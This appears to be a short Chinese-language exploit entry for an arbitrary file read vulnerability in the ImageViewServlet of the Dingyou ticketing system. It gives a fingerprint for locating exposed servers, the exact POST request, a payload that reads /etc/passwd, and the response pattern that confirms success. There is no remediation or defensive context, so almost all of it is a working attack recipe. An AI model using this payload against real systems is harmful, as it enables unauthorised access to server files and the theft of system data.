# 鼎游票务系统ImageViewServlet存在任意文件读取漏洞

鼎游票务系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/book/showgoodsIndex.action"`
- **请求**：`POST /system/ImageViewServlet HTTP/1.1`

**Payload**
```
imgurl=/etc/passwd
```
- **响应特征**：200 root: